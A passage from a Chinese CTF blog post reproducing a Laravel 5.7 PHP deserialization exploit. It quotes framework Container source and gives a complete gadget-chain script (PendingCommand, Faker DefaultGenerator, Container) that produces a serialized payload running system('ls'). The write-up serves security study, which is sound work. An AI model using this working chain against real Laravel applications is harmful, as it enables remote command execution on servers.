class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getConcrete</span>(<span class="hljs-params"><span class="hljs-variable">$abstract</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$concrete</span> = <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getContextualConcrete</span>(<span class="hljs-variable">$abstract</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$concrete</span>;<br>    &#125;<br>    <span class="hljs-comment">// If we don&#x27;t have a registered resolver or concrete for the type, we&#x27;ll just</span><br>    <span class="hljs-comment">// assume each type is a concrete name and will attempt to resolve it as is</span><br>    <span class="hljs-comment">// since the container should be able to resolve concretes automatically.</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;bindings[<span class="hljs-variable">$abstract</span>])) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;bindings[<span class="hljs-variable">$abstract</span>][<span class="hljs-string">&#x27;concrete&#x27;</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$abstract</span>;<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isBuildable</span>(<span class="hljs-params"><span class="hljs-variable">$concrete</span>, <span class="hljs-variable">$abstract</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$concrete</span> === <span class="hljs-variable">$abstract</span> || <span class="hljs-variable">$concrete</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Closure</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build</span>(<span class="hljs-params"><span class="hljs-variable">$concrete</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$concrete</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Closure</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$concrete</span>(<span class="hljs-variable language_">$this</span>, <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getLastParameterOverride</span>());<br>    &#125;<br><br>    <span class="hljs-variable">$reflector</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-variable">$concrete</span>);<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-variable">$reflector</span>-&gt;<span class="hljs-title function_ invoke__">isInstantiable</span>()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">notInstantiable</span>(<span class="hljs-variable">$concrete</span>);<br>    &#125;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;buildStack[] = <span class="hljs-variable">$concrete</span>;<br><br>    <span class="hljs-variable">$constructor</span> = <span class="hljs-variable">$reflector</span>-&gt;<span class="hljs-title function_ invoke__">getConstructor</span>();<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$constructor</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$this</span>-&gt;buildStack);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$concrete</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$dependencies</span> = <span class="hljs-variable">$constructor</span>-&gt;<span class="hljs-title function_ invoke__">getParameters</span>();<br>    <span class="hljs-variable">$instances</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resolveDependencies</span>(<br>        <span class="hljs-variable">$dependencies</span><br>    );<br><br>    <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$this</span>-&gt;buildStack);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$reflector</span>-&gt;<span class="hljs-title function_ invoke__">newInstanceArgs</span>(<span class="hljs-variable">$instances</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+
+<p>到这里其实就已经了然了。</p>
+<p>字符串<code>Illuminate\Contracts\Console\Kernel</code>作为<code>$this-&gt;bindings</code>的键值，去取另一个数组，并从另一个数组中以键值<code>concrete</code>取出一个对象，否则就返回<code>Illuminate\Contracts\Console\Kernel</code>，然后去<code>build</code>一个对象，但是我们之前给<code>app</code>传入的对象显然不能实例化，因为我们之前没有对<code>bindings</code>赋值，传进去的<code>concrete</code>是字符串<code>Illuminate\Contracts\Console\Kernel</code></p>
+<p>所以我们就得为<code>app</code>的值构造一下。</p>
+<p>先来看看我们需要什么，我们需要<code>app</code>是一个二维数组，[<code>Illuminate\Contracts\Console\Kernel</code>] &#x3D;&gt; [<code>concrete</code> &#x3D;&gt; 一个可以实例化的类]，并且这个类还得有call方法，因为最终返回的就是一个该类的实例化对象，然后调用这个对象的<code>call</code>方法</p>
+<p>最后发现就是</p>
+<p><code>Illuminate\Container</code>下的<code>Container</code>类好用，不仅有<code>bindings</code>属性，还有<code>call</code>方法</p>
+<p>于是再修改payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span>  <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Container</span>\<span class="hljs-title">Container</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingCommand</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>,<span class="hljs-variable">$parameters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Container</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">DefaultGenerator</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">default</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span> = [<span class="hljs-string">&#x27;1&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Container</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Container</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">bindings</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bindings = [<span class="hljs-string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span> =&gt; [<span class="hljs-string">&#x27;concrete&#x27;</span> =&gt; <span class="hljs-string">&#x27;Illuminate\Container\\Container&#x27;</span>]];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>\<span class="hljs-title class_">PendingCommand</span>;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PendingCommand</span>(<span class="hljs-string">&#x27;system&#x27;</span>,[<span class="hljs-string">&#x27;ls&#x27;</span>])));<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>然后就可以成功打通</p>
+<h2 id="2-后记"><a href="#2-后记" class="headerlink" title="2.后记"></a>2.后记</h2><p>1.判断哪里有问题就看程序在哪里crush掉，也就是类似于进入<code>catch</code>块</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$passable</span></span>) <span class="hljs-keyword">use</span> (<span class="hljs-params"><span class="hljs-variable">$destination</span></span>) </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$destination</span>(<span class="hljs-variable">$passable</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">handleException</span>(<span class="hljs-variable">$passable</span>, <span class="hljs-variable">$e</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">handleException</span>(<span class="hljs-variable">$passable</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FatalThrowableError</span>(<span class="hljs-variable">$e</span>));<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>2.动态调试还是比较重要的，不需要理解每一步具体是在干什么，但通过注释，变量名字大体都可以猜到是在干什么</p>
+<p>3.一步一步复现成功，还是很开心哒！</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Web/unserialize/" class="category-chain-item">unserialize</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PE/">#PE</a>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Laravel_5.7.* 反序列化复现</div>
+      <div>http://example.com/2023/10/07/Laravel/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>yring</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 7, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/08/ThinkPHP_5.1/" title="ThinkPHP_5.1.* 反序列化复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ThinkPHP_5.1.* 反序列化复现</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/23/SEH/" title="SEH笔记">
+                        <span class="hidden-mobile">SEH笔记</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <i class="iconfont icon-love"></i>nobody knows ,but we always know
+
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/star.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/yinghua.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/boom.js"></script>
+<script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+
+  <script async src="/js/fireworks.js"></script>
+  
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
